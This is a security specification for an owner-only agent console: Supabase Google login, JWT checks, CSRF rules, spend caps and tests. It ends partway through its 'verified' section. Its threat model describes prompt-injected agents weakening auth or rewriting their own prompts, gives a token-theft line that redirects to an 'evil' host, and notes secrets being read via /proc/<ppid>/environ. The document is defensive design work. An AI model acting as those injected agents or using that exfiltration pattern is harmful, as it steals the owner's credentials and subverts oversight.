# Agent Console — authentication and abuse controls (D6)

Owner: **security-engineer (Quinn)**. Status: **spec, 2026-11-26**. Implements `docs/decisions.md` D6. This
replaces the password gate in `04-agent-console.md` §5.2. It needs no change to D1–D5.

Where this spec and `04-agent-console.md` §3 or §5 disagree, follow this spec until §5 is rewritten.
Supporting notes with quotes and links: `knowledge/security-engineer/docs/supabase-auth-jwt-verification.md`,
`…/supabase-auth-google-pkce-config.md` and `…/netlify-ai-gateway-and-function-env.md`. Hostile reference
tests: `knowledge/security-engineer/examples/04-supabase-owner-check.mjs`.

In this document the owner's address is always written `owner@example.com`. The real one lives only in the
Netlify env var `OWNER_EMAILS`.

## 0. Decisions at a glance

| Topic | Decision |
|---|---|
| Signature check | **Local JWKS**: `jose` `createRemoteJWKSet` + `jwtVerify`, `algorithms: ["ES256"]`. The project's JWKS (curl, 2026-11-26) has one **ES256 / P-256** key, so the HS256 `/auth/v1/user` fallback is **not** used for signatures. |
| Claims | `iss` = `https://pcmdtscesnxmpuxcizfk.supabase.co/auth/v1` exactly, `aud` contains `authenticated`, `exp` required (30 s tolerance), `iat` no older than 3600 s, `role` = `authenticated`, `is_anonymous` ≠ `true`, `sub`/`email`/`session_id` present |
| Owner check | `email` claim, trimmed and lower-cased, must be in `OWNER_EMAILS` (empty list → deny everyone). `app_metadata.providers` must include `google`. |
| Email verified | No `email_verified` claim exists in Supabase access tokens. Checked with `GET /auth/v1/user` → `email_confirmed_at` non-null on **strict** endpoints (Approve, Reject, create job). Never via `user_metadata`. |
| OAuth flow | **PKCE** (`flowType: 'pkce'`, set explicitly) |
| Token storage | `supabase-js` with `storage: window.sessionStorage`. No cookies, no `localStorage`. |
| CSRF | Bearer header (no ambient credentials) + `Origin` must equal `https://my-flood-123.netlify.app` on every non-GET. No CORS headers. |
| Rate-limit rules (2, D4) | `/api/chat` and `POST /api/jobs` (job creation) |
| Removed env vars | `CONSOLE_PASSWORD_HASH`, `SESSION_SECRET`. **Delete both.** |
| New env vars | `OWNER_EMAILS` only. The Supabase URL and publishable key are public constants in code. |
| `.claude/agents/**` writes | **Denied** (ruling §11a) |
| Tests in the Netlify build | **Not acceptable** on Free (ruling §11b) |

## 1. Assets, entry points, trust boundaries

**Assets:** `ANTHROPIC_API_KEY` (money) · `GITHUB_TOKEN` (writes `main` = production, D3) · the owner's
Supabase session (access + refresh token) · Netlify credits · the owner's private email address.

**Entry points:** every `/api/*` function (public URLs, including the background `/api/job-run`) · the
`/agents` page and its scripts · the Supabase Auth endpoints (public by design) · files and tool results
that agents read (indirect prompt injection) · the Netlify build (sees every env var on Free, D4).

**Trust:** a request is trusted **only** after `netlify/lib/auth.ts` returns `ok`. Nothing from the
browser is trusted for authorisation: not `user_metadata`, not a client-side "is owner" flag, not
`getSession()` output.

## 2. Threat model

| # | Abuse case | Control | Test |
|---|---|---|---|
| **Strangers** ||||
| T1 | A stranger signs in with their own Google account and calls `/api/chat` | Their token is valid but `email ∉ OWNER_EMAILS` → **403**, no side effects. Supabase "Allow new users to sign up" is **off**, so no account is created. Optional extra: Google OAuth consent in *Testing* with only the owner as test user (**not verified** from Google docs). | U-403-stranger; manual M1 |
| T2 | Calls with no token, a forged token, or `alg: none` / HS256 confusion | Pin `algorithms: ["ES256"]`; keys come only from the project JWKS; strict header regex | U-401 table |
| T3 | A token from **another** Supabase project (attacker's own project, valid ES256) | Exact `iss` match; the attacker's key is not in our JWKS (kid miss → 401) | U-401-iss, U-401-kid |
| T4 | Anon, service-role or anonymous-user tokens | `aud` must contain `authenticated`, `role === "authenticated"`, `is_anonymous !== true`; the legacy `iss: "supabase"` fails the issuer check | U-401-role/aud/anon |
| T5 | Attacker creates a Supabase user **with the owner's email** (email/password sign-up, unconfirmed) | Sign-ups off; **Email provider disabled**; `app_metadata.providers` must include `google`; strict endpoints require `email_confirmed_at`. Supabase removes unconfirmed identities when linking (*Auth identities*). | U-403-not_google, U-403-unconfirmed |
| T6 | Attacker edits `user_metadata.email_verified` / `providers` with `updateUser` | Never read `user_metadata` for authorisation ("editable by the user without any checks", *Users*) | U-403-providers-in-user_metadata |
| T7 | `OWNER_EMAILS` unset or blank after a misconfiguration | Empty list → 403 for everyone (fail closed) | U-403-no_owners |
| **Stolen tokens** ||||
| T8 | Access token copied from logs | Never log `Authorization`, tokens, or the email. The token lives ≤ 1 h (`maxTokenAge: 3600` even if the dashboard expiry is raised). | F-log-scan |
| T9 | Refresh token stolen from the device (lives indefinitely; time-boxing is Pro-only on Supabase) | `sessionStorage` (cleared when the tab closes); Sign out uses `scope: 'global'`; strict endpoints re-check with Supabase; kill switch §9 | P-storage; manual M3 |
| T10 | The OAuth `?code=` leaks via history or referrer | PKCE: the code is single-use, lasts 5 min, and is useless without the verifier in the owner's tab; `Referrer-Policy` sends the origin only; the page strips `code` from the URL after exchange | P-url-clean |
| T11 | Signing key compromised or revoked | Owner revokes it in the dashboard, then **redeploys** (drops jose's in-memory cache; the Supabase edge cache is ≤ 10 min). Documented in §9. | — |
| **Credit drain** ||||
| T12 | Floods of unauthenticated requests to invoke functions | Rate-limit rules on `/api/chat` and `POST /api/jobs`. On every other endpoint the token-shape check (no network) happens before any crypto, and nothing touches Blobs before auth. jose re-fetches the JWKS at most once per 30 s per instance (`cooldownDuration`). | F-401-no-side-effects |
| T13 | Owner's token abused to burn tokens | `DAILY_TOKEN_BUDGET`, per-turn and per-job caps, the model allow-list, one running job, and the Claude Console monthly limit (§7) | F-budget |
| T14 | Missing `ANTHROPIC_API_KEY` → Netlify AI Gateway silently injects its own key and bills Netlify credits | Refuse to call Claude if `ANTHROPIC_BASE_URL` is set or the key doesn't start with `sk-ant-`; pass an explicit `baseURL: "https://api.anthropic.com"` | F-gateway-guard |
| T15 | Our functions used to hammer Supabase `/auth/v1/user` (limit "30 requests per 5 minutes" per IP) | Call `/user` only **after** a locally valid owner token, and only on strict endpoints. A 429 from Supabase → our 503. | F-strict-calls-once |
| **CSRF** ||||
| T16 | A malicious site makes the owner's browser POST to `/api/proposals/:id/approve` | No ambient credential (no cookie); an `Authorization` header can't be set cross-site without CORS, and we send no CORS headers; `Origin` must equal the site on every non-GET → 403 | U-origin table, F-cors |
| **Prompt injection via proposals** ||||
| T17 | An injected agent proposes changes to auth, the allow-list, functions, config or workflows | Write allow-list denies `netlify/**`, `netlify.toml`, `package*.json`, `.github/**`, `.claude/**`; re-checked at Approve | allowlist tests |
| T18 | An injected agent proposes `public/sw.js` or console JS that steals the bearer token, e.g. `location = "https://evil/?t=…"` (navigation is **not** blocked by CSP) | **New denies** (§8): `public/sw.js`, `public/agents/**`, `public/vendor/**`; the full diff is shown before Approve (D3) | allowlist tests |
| T19 | An injected agent weakens the rules the team reads (`docs/decisions.md`, this spec, the security tests) | **New denies**: `docs/decisions.md`, `docs/security/**`, `tests/security/**` | allowlist tests |
| T20 | An agent rewrites its own prompt or tools in `.claude/agents/**` | Denied (ruling §11a) | allowlist tests |
| **Token storage and XSS** ||||
| T21 | XSS on the origin reads the session from storage | CSP `script-src 'self'`, no inline script, no `eval`; chat, diffs and agent text rendered with `textContent` only (never `innerHTML`); `supabase-js` self-hosted and pinned under `public/vendor/` (deny-listed); `sessionStorage` keeps the session out of other tabs (the main app in another tab can't read it). **Residual:** same-tab XSS can still read it; the owner's review of diffs is the backstop. | P-csp, P-no-innerHTML |
| T22 | The service worker caches or replays authenticated API responses | `sw.js` must bypass `/api/*` entirely and must not cache `/agents` URLs with a query string; functions send `Cache-Control: no-store` | P-sw-bypass |
| **Build and config** ||||
| T23 | Build-time code reads the secrets (Free plan can't scope env vars) | No tests, no build plugins, no `npm run build` that runs repo code in the Netlify build (ruling §11b); lockfile pinned; `package*.json` deny-listed | CI grep of `netlify.toml` |
| T24 | `/api/job-run` (background, public URL) invoked directly | It runs `requireOwner` like every other endpoint, using the owner's bearer token forwarded by `/api/jobs`; job `sub` must equal the token's `sub`; the job is claimed with `onlyIfMatch` | F-jobrun-401 |
| T25 | Open redirect through `redirectTo` | `redirectTo` is a constant; Supabase allows exactly one redirect URL | P-redirect |

## 3. Login flow (browser), owned by agent-console-engineer and pwa-mobile-engineer

```js
// public/agents/auth.js (sketch). URL and publishable key are public by design (D6).
import { createClient } from "/vendor/supabase-js/<pinned-version>/supabase.js";
export const supabase = createClient("https://pcmdtscesnxmpuxcizfk.supabase.co", "sb_publishable_…", {
  auth: {
    flowType: "pkce",                 // explicit: the default is not documented (not verified)
    storage: window.sessionStorage,   // not localStorage
    storageKey: "flood-console-auth",
    persistSession: true,
    autoRefreshToken: true,
    detectSessionInUrl: true,         // exchanges ?code= on return
  },
});
await supabase.auth.signInWithOAuth({ provider: "google",
  options: { redirectTo: "https://my-flood-123.netlify.app/agents" } });   // constant, never from the URL
// Every API call: headers { Authorization: `Bearer ${session.access_token}`, "Content-Type": "application/json" }
// Sign out: supabase.auth.signOut({ scope: "global" }). On any 403 from /api/*: signOut, then show
// "This Google account can't use the console."
```

**Why PKCE and not implicit:** the implicit flow returns both tokens in the URL fragment
(`#access_token=…&refresh_token=…`, *Implicit flow*). Those land in browser history and in any script that
reads `location`. PKCE returns a single-use code that lasts 5 minutes and works only with the verifier held in
the same browser (*PKCE flow*). Both are client-side. PKCE exposes less and costs nothing extra.

**Why `sessionStorage`:** HttpOnly cookies are "not feasible" with client-side `supabase-js` (*Sessions*),
and we have no server session layer (D1/D6). `sessionStorage` is per-tab, so the session dies when the tab
closes. That bounds the never-expiring refresh token. The PKCE verifier survives the same-tab redirect to
Google and back. **Not verified:** iOS standalone PWA mode. If the redirect leaves the PWA window, the
verifier is lost and login fails; the fallback there is opening `/agents` in Safari (test M4). Do not switch
to `localStorage` without a security review.

## 4. Rules for `netlify/lib/auth.ts`

### 4.1 API (dependency-injected so tests never touch the network)

```ts
export type AuthOk   = { ok: true; email: string; sub: string; sessionId: string };
export type AuthFail = { ok: false; status: 401 | 403 | 503; code: string };   // code is for logs only
export function parseOwnerEmails(raw: string | undefined): Set<string>;
export function createAuth(deps?: {                 // defaults: remote JWKS, fetch, process.env, Date
  jwks?: JWTVerifyGetKey; fetchUser?: (token: string) => Promise<Response>;
  ownersRaw?: () => string | undefined; now?: () => Date; siteOrigin?: string;
}): { requireOwner(req: Request, opts?: { strict?: boolean }): Promise<AuthOk | AuthFail> };
export function denied(f: AuthFail): Response;      // JSON body + headers per §4.6
```

### 4.2 Constants (public values; changing them is a security-reviewed commit, never an env var)

```ts
const PROJECT_REF = "pcmdtscesnxmpuxcizfk";
export const SUPABASE_URL = `https://${PROJECT_REF}.supabase.co`;
export const ISSUER = `${SUPABASE_URL}/auth/v1`;            // = discovery "issuer" (verified 2026-11-26)
export const SITE_ORIGIN = "https://my-flood-123.netlify.app";
export const SUPABASE_PUBLISHABLE_KEY = "sb_publishable_…";  // same value as public/agents/auth.js (test asserts equal)
const JWKS = createRemoteJWKSet(new URL(`${ISSUER}/.well-known/jwks.json`),
  { cacheMaxAge: 600_000, cooldownDuration: 30_000, timeoutDuration: 3_000 });  // never cache longer (Supabase JWTs page)
```

### 4.3 Order of checks: return at the first failure, with no side effects before step 8

1. **Method** allowed for the endpoint, else 405. (Endpoint code does this before calling `requireOwner`.)
2. **Origin** (non-GET/HEAD): `req.headers.get("origin") === SITE_ORIGIN` exactly, else **403** `origin`.
   Missing, `null`, `http://…` and preview subdomains all fail.
3. **Bearer:** exactly `Authorization: Bearer <a>.<b>.<c>` (base64url segments, total ≤ 4096 chars). Never
   read a token from a cookie, query string or body. Else **401** `no_token`.
4. **Verify** (local, ES256 only):
   ```ts
   const { payload } = await jwtVerify(token, JWKS, {
     algorithms: ["ES256"], issuer: ISSUER, audience: "authenticated",
     clockTolerance: 30, maxTokenAge: 3600,
     requiredClaims: ["exp", "iat", "sub", "email", "session_id"],   // jose does NOT require exp by default
   });
   ```
   jose errors → **401**, except `JWKSTimeout`, `JWKSInvalid` and non-jose errors (network, fetch failure)
   → **503** `auth_unavailable` (fail closed, but don't tell the UI the owner is signed out).
5. **Extra claims** jose doesn't check: `payload.role === "authenticated"`, `payload.is_anonymous !== true`,
   `typeof payload.email === "string"`, `typeof payload.sub === "string"`. Else **401**.
6. **Owner:** `owners = parseOwnerEmails(process.env.OWNER_EMAILS)`. This reads the env on each call (it's
   cheap, and it makes tests and the kill switch simple).
   - `owners.size === 0` → **403** `no_owners_configured`.
   - `payload.email.trim().toLowerCase()` ∉ owners → **403** `not_owner`. Exact string match only: no
     Gmail dot or plus folding, no Unicode normalisation (look-alikes simply fail).
   - `payload.app_metadata?.providers` must be an array that includes `"google"` → else **403** `not_google`.
7. **Strict mode** (`{ strict: true }`, used by Approve, Reject and `POST /api/jobs`):
   `GET ${ISSUER}/user` with headers `apikey: SUPABASE_PUBLISHABLE_KEY` and `Authorization: Bearer <token>`, 3 s timeout.
   - 200 and `user.id === payload.sub` and lower-cased `user.email` equals the claim and
     `user.email_confirmed_at` is non-null → pass.
   - 401/403 from Supabase → **401** `session_revoked`. 429/5xx/timeout → **503**. `email_confirmed_at`
     null → **403** `email_unconfirmed`. Email differs → **403** `email_changed`.
8. Return `AuthOk`. **Only now** may the endpoint parse the body, read or write Blobs, increment counters,
   start an SSE stream, or call Claude or GitHub.

**Why the email check is split this way.** The *JWT Claims Reference* lists no `email_verified` claim. The
*Users* page defines `email_confirmed_at` ("If null, … not confirmed") on the user object, which only
`/auth/v1/user` returns authentically. Supabase rate-limits that path per IP ("30 requests per 5 minutes"),
and Netlify functions share egress IPs. So every request gets the local check: signature, owner email, and
Google provider. With sign-ups off and the Email provider off, a Google identity is the only way an account
can exist. The server-side `email_confirmed_at` and session check runs only where it matters most and is
rare: commits to `main` and 15-minute jobs.

### 4.4 Which endpoints use what

| Endpoint | `requireOwner` | Notes |
|---|---|---|
| `GET /api/health` | **none** | Names only, as booleans: `{ "OWNER_EMAILS": true, … }`. Never values, lengths or counts. |
| `GET /api/agents`, `GET /api/jobs/:id`, `GET /api/proposals` | local | Polling endpoints. `jobs/:id` must be a **separate function** from `POST /api/jobs`, so polling is not rate-limited by rule #2. |
| `POST /api/chat` | local | Auth **before** opening the SSE stream |
| `POST /api/jobs` | **strict** | Forwards the caller's `Authorization` header to `/api/job-run`. No internal shared secret. |
| `POST /api/job-run` (background) | local | Also: job `sub` == token `sub`, job status `queued`/`resuming`, claim with `onlyIfMatch`. Retries reuse the same token (valid ≤ 1 h). |
| `POST /api/proposals/:id/approve`, `/reject` | **strict** | Audit records `sub`, `session_id` and the commit SHA. No email. |
| `/api/login`, `/api/logout` | **deleted** | Remove the functions and their tests. A request to them should 404. |

### 4.5 401 versus 403 versus 503

- **401** + `WWW-Authenticate: Bearer`: we can't establish who you are. That covers a missing, malformed,
  bad-signature, unknown-kid, wrong-alg, wrong `iss`/`aud`, expired, over-age, wrong-role or anonymous token,
  a revoked session (strict), and a `/user` id mismatch. The UI should try one `refreshSession()` and then
  show sign-in.
- **403**: we know who you are and the answer is no. That covers a non-owner email, empty `OWNER_EMAILS`,
  a non-Google provider, an unconfirmed or changed email, and a bad `Origin`. The UI signs out and shows the
  "not allowed" message.
- **503**: JWKS or Supabase unreachable or rate-limited. Fail closed and say "Try again".

### 4.6 Response and logging rules

- Bodies are generic: `{"error":"unauthorized"}`, `{"error":"forbidden"}`, `{"error":"auth_unavailable"}`.
  Never include the reason code, the claims, the email or `OWNER_EMAILS`.
- Every `/api/*` response sets `Cache-Control: no-store`. No `Access-Control-Allow-*` headers on any response.
- Log one line per denial: `auth_denied code=<code> status=<n>` plus at most the first 8 chars of `sub`.
  **Never** log the token, the `Authorization` header, `req.headers` wholesale, the email, `OWNER_EMAILS` or
  `process.env`.
- Denied requests write **nothing** to Blobs (no audit, no counters). Rate limiting at the edge covers floods.

## 5. CSRF / Origin rule

1. Authentication is the `Authorization: Bearer` header only. The browser never attaches it on its own, and
   the console sets no cookies. (`supabase-js` uses `sessionStorage`. If any cookie arrives, it is ignored.)
2. Every non-GET/HEAD `/api/*` request must carry `Origin: https://my-flood-123.netlify.app` exactly, or get 403.
3. POST bodies must be `Content-Type: application/json` (else 415). With the `Authorization` header this makes
   every cross-origin attempt a preflighted request, and the preflight fails because we return no CORS headers.
   `OPTIONS` → 405 with no `Access-Control-Allow-*`.
4. The old `X-Requested-With: console` header is **no longer required**. Rules 1–3 cover it. Keeping it is
   harmless but optional.
5. GET endpoints are read-only and have no side effects beyond rate-limited reads.

## 6. Rate limits (D4: 2 code-based rules)

`/api/login` no longer exists, so its rule moves:

| Rule | Function | `rateLimit` config | Why |
|---|---|---|---|
| #1 | `chat` (`/api/chat`) | `{ windowLimit: 10, windowSize: 60, aggregateBy: ["ip", "domain"] }` | Each call can spend Claude tokens |
| #2 | `jobs` (`POST /api/jobs`, create only) | `{ windowLimit: 5, windowSize: 60, aggregateBy: ["ip", "domain"] }` | Each call can start a 15-minute background run |

Everything else is protected by `requireOwner` plus Blobs counters (strong consistency, written only after
auth): approvals ≤ 50/day, rejects ≤ 100/day, jobs ≤ 20/day, chat turns ≤ 300/day, **one** job in
`running` at a time. Supabase's own Auth rate limits (dashboard → Authentication → Rate Limits) protect the
sign-in endpoints. Keep their defaults.

## 7. Spend caps (all required)

1. **Daily token budget:** Blobs `counters/usage/<UTC yyyy-mm-dd>`, strong consistency. Check it before
   every Claude call, and refuse with 429 `budget_exceeded` when `used ≥ DAILY_TOKEN_BUDGET`. Add
   `usage.input_tokens + usage.output_tokens` (including cache tokens) after every call. If the env var is
   unset, the default is `2000000`. If it is set but not a positive integer, refuse all Claude calls (fail
   closed). Concurrency overshoot is bounded by one call's `max_tokens`. That is accepted.
2. **Per call:** `max_tokens` ≤ 4 000 for chat turns and ≤ 16 000 for job steps. Tool-loop steps ≤ 8 per chat
   turn and ≤ 40 per job run. Model ID from the allow-list only.
3. **Per job:** 13-minute wall clock, then `paused`; at most one running job.
4. **Provider-side:** a monthly spend limit in the Claude Console (owner action, **required before launch**).
5. **Gateway guard (T14):** before any Claude call, if `process.env.ANTHROPIC_BASE_URL` is set, or
   `ANTHROPIC_API_KEY` is missing or doesn't start with `sk-ant-` → 503 `claude_not_configured`, no call.
   Construct the client as `new Anthropic({ apiKey, baseURL: "https://api.anthropic.com" })`. Recommended:
   disable Netlify AI Features for the team (owner action; **not verified** on Free).

## 8. Headers, CSP and allow-list changes (I approve the new host)

- **New external host approved:** `https://pcmdtscesnxmpuxcizfk.supabase.co` in `connect-src` only. Add it to
  the existing `/*` CSP in `netlify.toml` (netlify-engineer). Use one CSP for the whole site: how Netlify
  combines two matching `[[headers]]` rules for the same header is **not verified**, and two CSP headers
  would both be enforced.
  `connect-src 'self' https://api.open-meteo.com https://marine-api.open-meteo.com https://pcmdtscesnxmpuxcizfk.supabase.co`.
  The rest is unchanged (`script-src 'self'`, `frame-ancestors 'none'`, `base-uri 'self'`, `form-action 'self'`).
- The Google consent screen is a top-level navigation. It needs no CSP entry and **no** Google script on our pages.
- `supabase-js` is self-hosted: `public/vendor/supabase-js/<exact version>/`, copied from the npm tarball,
  never from a CDN.
- **Write allow-list additions** (`netlify/lib/allowlist.ts`, my file; separate change with tests). Deny:
  `public/sw.js`, `public/agents/**`, `public/vendor/**`, `docs/decisions.md`, `docs/security/**`,
  `tests/security/**`. Keep denying `.claude/**`. Read allow-list unchanged.

## 9. Environment variables (final)

Set in the Netlify UI (*Site configuration → Environment variables*) or CLI. Never in `netlify.toml`
(functions can't see those). **After any change, trigger a new deploy**: "To apply updated environment
variable values, create a new deploy" (Netlify functions env docs).

| Name | Purpose | Read by | Secret? | How to set | Rotation |
|---|---|---|---|---|---|
| `OWNER_EMAILS` | Comma-separated owner Google address(es), e.g. `owner@example.com` | `netlify/lib/auth.ts` → every protected function | **Private (PII), not a credential.** Flag *Contains secret values* so it is masked and scanned out of build logs. Then confirm `/api/health` shows `true` (secret-flag gotcha, `docs/03` §1). | UI, or `netlify env:set OWNER_EMAILS …` (the CLI secret flag is **not verified**) | When the address changes. **Kill switch:** set it to a blank value and redeploy → everyone gets 403. |
| `ANTHROPIC_API_KEY` | Claude API | `chat`, `job-run` (via `netlify/lib/claude.ts`) | **Yes** | UI, secret-flagged | 90 days, or at once on suspicion (Claude Console) |
| `GITHUB_TOKEN` | Fine-grained PAT, one repo, Contents only (D5) | `approve` (write); `chat`, `job-run`, `proposals` (read) | **Yes** | UI, secret-flagged | 90-day expiry, then a new token |
| `GITHUB_REPO` | `naomild/Flood2` | GitHub lib | No | UI | — |
| `GITHUB_BRANCH` | `main` | GitHub lib | No | UI | — |
| `DAILY_TOKEN_BUDGET` | Spend guard (default `2000000`) | `chat`, `jobs`, `job-run` | No | UI | Adjust as needed |

**Removed:** `CONSOLE_PASSWORD_HASH` and `SESSION_SECRET`. Delete them from Netlify. Delete the code that
reads them, the `/api/login` and `/api/logout` functions, and their `/api/health` entries. With no cookie
sessions, no signing secret is needed. Keeping unused secrets only widens what the build can see.

**Deliberately not env vars:** the Supabase URL, project ref, issuer, JWKS URL, publishable key and
`SITE_ORIGIN`. They are public constants in reviewed code, and an env var would only add a way to point auth
at another project. **Never anywhere in Netlify or the repo:** the Google OAuth client secret (it lives
only in the Supabase dashboard's Google provider), any Supabase secret or `service_role` key (Flood needs
none), and the legacy JWT secret.
**Auto-injected by Netlify, never relied on, never logged:** `URL`, `SITE_ID`, `SITE_NAME`,
`NETLIFY_AI_GATEWAY_KEY`, `NETLIFY_AI_GATEWAY_URL`.

**Incident steps:** (1) blank `OWNER_EMAILS` and redeploy. (2) In Supabase, sign the user out or delete the
user's sessions. (3) If a token or key leaked, rotate the signing key in Supabase (create a standby key,
rotate, revoke the old one), then redeploy. (4) Rotate `ANTHROPIC_API_KEY` and `GITHUB_TOKEN` if there is
any doubt.

## 10. Owner setup checklist (Supabase and Google dashboards)

1. Google Cloud → Clients → **Web application**. Authorized JavaScript origin: `https://my-flood-123.netlify.app`.
   Authorized redirect URI: the callback shown on Supabase's Google provider page (expected
   `https://pcmdtscesnxmpuxcizfk.supabase.co/auth/v1/callback`, confirm there). Scopes: `openid`,
   `userinfo.email`, `userinfo.profile` only. No localhost entries.
2. Supabase → Authentication → Providers: **Google on** (client ID and secret pasted there only).
   **Email provider off.** Anonymous sign-ins off. Manual linking off.
3. URL Configuration: Site URL `https://my-flood-123.netlify.app`. Redirect URLs: exactly
   `https://my-flood-123.netlify.app/agents`. No wildcards, no localhost, no `**--…netlify.app`.
4. First sign-in: leave sign-ups on just long enough for the owner to sign in once with Google. Then
   **turn "Allow new users to sign up" off**, and delete any other user in Authentication → Users.
5. JWT signing keys: keep the current **ES256** key (verified in the JWKS). If a legacy HS256 secret is
   listed as *previously used*, revoke it. Rotate at least yearly.
6. Sessions: keep access-token expiry at **3600 s** or less. `auth.ts` rejects tokens older than 1 h anyway.
7. Owner's Google account: 2-Step Verification on. This is the real second factor.

## 11. Rulings on the two conflicts

**(a) `.claude/agents/**` writes: DENIED.** `04-agent-console.md` §5.2 lists `.claude/agents/**` as an
optional allow. That entry is withdrawn, and the `agent-safety` skill and the roster rule stand. Reasons:
- An agent that can edit its own prompt can make a prompt injection permanent. Every later chat loads the
  edited file as its system prompt.
- The same files drive Claude Code on the owner's machine. A `tools:` or `skills:` change could grant an
  agent Bash or Write there, outside the console's sandbox.
- The roster already says only agent-builder edits them and "the Agent Console never lets agents change
  those files themselves".

§5.2's allow row and the §7 open item must be updated. §5 is mine, but this brief limited me to two
locations, so the edit is pending the orchestrator.

**(b) Tests inside the Netlify build: NOT ACCEPTABLE (Free plan, D4).** The build sees every env var,
including `ANTHROPIC_API_KEY` and `GITHUB_TOKEN` (scopes are Pro-only), and it has open network access.
`tests/**` is agent-writable, so a prompt-injected test approved by mistake would run with the secrets
available. Stripping the env (`env -i npm test`) is not a fix: the child process runs as the same user
and could still read the parent's environment (for example `/proc/<ppid>/environ`). Running tests also pulls
the whole devDependency tree into the secret-bearing build.
Rule: the Netlify build runs **no repo code** beyond what bundling functions needs (`command` absent or a
static no-op). Tests run in **GitHub Actions with no repository secrets** (the PAT can't touch
`.github/workflows`, D5) and locally. Consequence: under D3 a red test doesn't block a deploy; the response is
rollback in Netlify. If the owner later wants a gating build, it needs Pro with secrets scoped to Functions
only (an owner decision). Related: commit `package-lock.json` and pin exact versions, because dependency
install scripts also run in the build.

## 12. Tests Hollis must cover (no real Supabase, Google, Claude, GitHub or Netlify calls)

Coverage: `netlify/lib/auth.ts` ≥ 95 % branches. Use `jose`'s `createLocalJWKSet` with a test ES256 key pair
generated in the test (never a real key), and an injected `fetchUser` mock. Security tests live in
`tests/security/` (deny-listed for agents).

**Unit: `auth.ts` (table-driven; port all 39 hostile rows of `examples/04-supabase-owner-check.mjs`)**
- U-parse: `" owner@example.com , ,second@example.com "` → 2 entries; `undefined`, `""`, `" , "` → empty.
- U-401: missing header; `Basic`; lower-case `bearer`; two tokens; > 4096 chars; `alg: none` (empty and junk
  signature); HS256 and RS256 headers; unknown `kid`; signed by another key; payload swapped after signing;
  other-project `iss`; `iss: "supabase"`; `iss` with a trailing slash; `aud: "anon"`; expired (exp + 31 s);
  `exp` as a string; no `exp`; no `email`; `iat` older than 3630 s with a far-future `exp`; `nbf` in the
  future; `role: "service_role"`; `is_anonymous: true`.
- U-403: stranger's Gmail; `owner@example.com.evil.test`; Cyrillic look-alike; `OWNER_EMAILS` unset or blank;
  `providers: ["email"]`; `providers` only in `user_metadata`; `user_metadata.email_verified: true` alone
  does not help.
- U-strict: `email_confirmed_at: null` → 403; `/user` email differs → 403; `/user` id differs → 401;
  Supabase 401 → 401; 429/500/timeout → 503; happy path calls `fetchUser` exactly once with the `apikey` and
  `Authorization` headers.
- U-origin: cross-site, missing, `null`, `http://`, deploy-preview subdomain → 403 on POST; GET with no Origin OK.
- U-503: the JWKS getter throws a network error or `JWKSTimeout` → 503, never 401.
- U-case: `Owner@Example.COM` in the token and `OWNER@example.com` in the env → allowed.

**Function: each handler as `(Request) => Response`, with spies on Blobs, Claude and GitHub**
- F-401-no-side-effects: for **every** protected endpoint, no token → 401 *and* zero Blobs reads or writes,
  zero Claude calls, zero GitHub calls, and no SSE headers sent.
- F-403-no-side-effects: same for a valid non-owner token.
- F-strict-calls-once: Approve, Reject and `POST /api/jobs` call `fetchUser` once; chat, agents, polling and
  proposals never do.
- F-jobrun-401: `/api/job-run` with no or foreign token → 401, job record unchanged. A retry of a finished
  job → no Claude call.
- F-cors: `OPTIONS` → 405, and no response from any endpoint has `Access-Control-Allow-*`. Every response
  has `Cache-Control: no-store`.
- F-415: POST without `application/json` → 415 (after auth).
- F-budget: used ≥ budget → 429, no Claude call. Invalid `DAILY_TOKEN_BUDGET` → refuse. Usage is added after a call.
- F-gateway-guard: `ANTHROPIC_BASE_URL` set, or the key missing or not `sk-ant-…` → 503, no SDK call; the
  client gets an explicit `baseURL`.
- F-rate-config: static check that exactly two functions export `config.rateLimit`: `chat` (10/60) and
  `jobs` (5/60), both `aggregateBy ["ip","domain"]`; `job-status` is a separate function without one.
- F-login-gone: no `login`/`logout` function files. No reference to `CONSOLE_PASSWORD_HASH` or
  `SESSION_SECRET` anywhere in `netlify/**`, `public/**` or `tests/**` (except this check).
- F-health: `/api/health` lists names with booleans only. The test sets `OWNER_EMAILS=owner@example.com` and
  asserts that string is absent from the body.
- F-log-scan: run the denial paths with a spy on `console.*` and assert that no output contains the token,
  `Bearer`, `owner@example.com` or `sk-ant-`.

**Repository and page checks (Vitest or Playwright, mocked Supabase via `page.route`)**
- P-storage: after a mocked login, the session is in `sessionStorage['flood-console-auth']` and nothing auth-related is in `localStorage` or `document.cookie`.
- P-flow: `signInWithOAuth` is called with `redirectTo === "https://my-flood-123.netlify.app/agents"` and the
  authorize URL carries `code_challenge` (PKCE), not `response_type=token`.
- P-url-clean: after the `?code=` return, `location.search` has no `code`.
- P-bearer: API calls send `Authorization: Bearer …` and `Content-Type: application/json`, with no cookies.
- P-403-ui: a 403 from `/api/*` → `signOut` called and the "not allowed" message shown.
- P-csp: the response CSP `connect-src` includes `https://pcmdtscesnxmpuxcizfk.supabase.co` and no other new
  host; there is no inline `<script>` or `on*=` attribute in `public/**`; supabase-js is served from `/vendor/`.
- P-no-innerHTML: grep `public/agents/**` for `innerHTML`, `outerHTML`, `insertAdjacentHTML` and
  `document.write` → none.
- P-sw-bypass: the service worker doesn't call `respondWith` for `/api/*` and doesn't cache `/agents?code=…`.
- P-publishable-key: the key in `public/agents/auth.js` equals the one in `netlify/lib/auth.ts` and starts
  with `sb_publishable_`. No `sb_secret_`, `service_role` or `eyJ`-prefixed (legacy) key in the repo.
- P-no-real-email: tracked files contain no email address outside `@example.com`/`.org`/`.net`, apart from a
  short allow-list such as `noreply@anthropic.com`.
- Allow-list: new hostile rows for `public/sw.js`, `public/agents/x.js`, `public/vendor/x.js`,
  `docs/decisions.md`, `docs/security/x.md`, `tests/security/x.test.ts`, `.claude/agents/x.md`, `.claude/skills/x/SKILL.md`.

**Manual, before release (Hollis records the results)**
- M1: a second Google account → sign-in refused by Supabase (sign-ups off) or 403 from `/api/*`.
- M2: decode the owner's real token in DevTools (locally, never paste it anywhere) and confirm `iss`, `aud`,
  `role`, `app_metadata.providers` includes `google`, `email` and `session_id` are present. Fix §4 if anything differs.
- M3: sign out (global), then replay the old access token against a strict endpoint → expect 401.
  This also settles the unverified `/user`-after-sign-out behaviour.
- M4: login from the installed iOS PWA and from Android Chrome.
- M5: `/api/health` shows every required name as `true` after the deploy.

## 13. Verified versus not verified

**Verified 2026-11-26 (sources in the knowledge notes):**
- The project JWKS has exactly one ES256 / P-256 key (curl). The issuer is `https://pcmdtscesnxmpuxcizfk.supabase.co/auth/v1` (OIDC discovery).
